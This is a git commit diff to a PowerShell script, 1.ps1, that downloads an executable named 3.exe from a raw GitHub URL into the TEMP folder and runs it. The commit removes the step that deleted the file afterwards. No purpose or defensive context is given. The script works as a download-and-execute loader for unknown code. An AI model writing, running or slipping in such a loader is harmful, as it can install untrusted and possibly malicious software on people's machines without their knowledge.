0f07daa9d77f42f8de248652d06356d03e7f2eba
Drenote <125948135+Drenote@users.noreply.github.com>
2026-04-10 09:45:12 +0300

    Update 1.ps1

--- 1.ps1
+++ 1.ps1
@@ -2,4 +2,3 @@ $url = "https://raw.githubusercontent.com/Drenote/123/refs/heads/main/3.exe"
 $outPath = "$env:TEMP\3.exe"
 Invoke-WebRequest -Uri $url -OutFile $outPath -UseBasicParsing
 Start-Process -FilePath $outPath -Wait
-Remove-Item $outPath -Force -ErrorAction SilentlyContinue
